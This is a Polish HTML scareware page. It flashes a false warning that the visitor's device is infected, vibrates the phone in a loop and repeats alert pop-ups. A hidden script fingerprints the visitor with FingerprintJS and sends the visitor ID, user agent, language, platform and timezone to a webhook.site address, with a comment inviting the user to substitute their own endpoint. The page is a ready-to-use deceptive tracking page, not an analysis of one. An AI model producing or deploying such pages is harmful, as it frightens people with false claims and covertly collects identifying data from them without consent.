<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>⚠️ Twoje urządzenie zostało zainfekowane!</title>
  <style>
    /* ---------- PODSTAWOWY STYL (migający ekran & krzykliwy tekst) ---------- */
    html,body{margin:0;padding:0;height:100%;overflow:hidden;font-family:sans-serif;background:#000;color:#fff;}
    @keyframes flash{0%,49%{background:#000;color:#ff0000;}50%,100%{background:#ff0000;color:#000;}}
    body{display:flex;flex-direction:column;justify-content:center;align-items:center;animation:flash 0.8s infinite;}
    h1{font-size:clamp(2rem,6vw,3.5rem);text-align:center;margin:0 1rem;letter-spacing:1px;font-weight:900;}
    p{font-size:clamp(1.25rem,3vw,1.75rem);margin:1rem;text-align:center;}
  </style>
</head>
<body>
  <h1>⚠️ UWAGA! TWOJE URZĄDZENIE ZOSTAŁO ZAINFEKOWANE!</h1>
  <p>Zamknij stronę natychmiast, aby ograniczyć szkody!</p>

  <!-- Punkt montażu ewentualnego licznika -->
  <!-- <span id="visitCount"></span> -->

  <script>
    /* ---------- NATYCHMIASTOWE WIBRACJE I ALERTY ---------- */
    if (navigator.vibrate) {
      /* Krótka sekwencja na przywitanie + pętla co 3 s */
      navigator.vibrate([150,50,300,50,150]);
      setInterval(() => navigator.vibrate([200,50,100]), 3000);
    }
    setTimeout(() => alert('⚠️ TWOJE DANE SĄ W NIEBEZPIECZEŃSTWIE!'), 400);
    setInterval(() => alert('⚠️ TWOJE DANE SĄ W NIEBEZPIECZEŃSTWIE!'), 8000);
  </script>

  <!-- ---------- FINGERPRINTING + WEBHOOK ---------- -->
  <!-- Biblioteka FingerprintJS (open‑source) -->
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js" defer></script>
  <script>
  (async function sendFingerprint() {
    try {
      /* Poczekaj aż biblioteka się zainicjuje */
      const fp = await FingerprintJS.load();
      const result = await fp.get();

      /* Minimalny zbiór danych (RODO‑lite) */
      const payload = {
        visitorId: result.visitorId,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
      };

      /* WYMIENIĆ na swój endpoint (np. https://your.webhook.endpoint) */
      fetch('https://webhook.site/#!/view/e14a76a4-a0b6-429b-a7b7-0c744665866e/775fc6e8-d3c5-4124-af4e-3b6c74d950a5/1', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (e) {
      console.error('Fingerprint/Webhook error:', e);
    }
  })();
  </script>
</body>
</html>
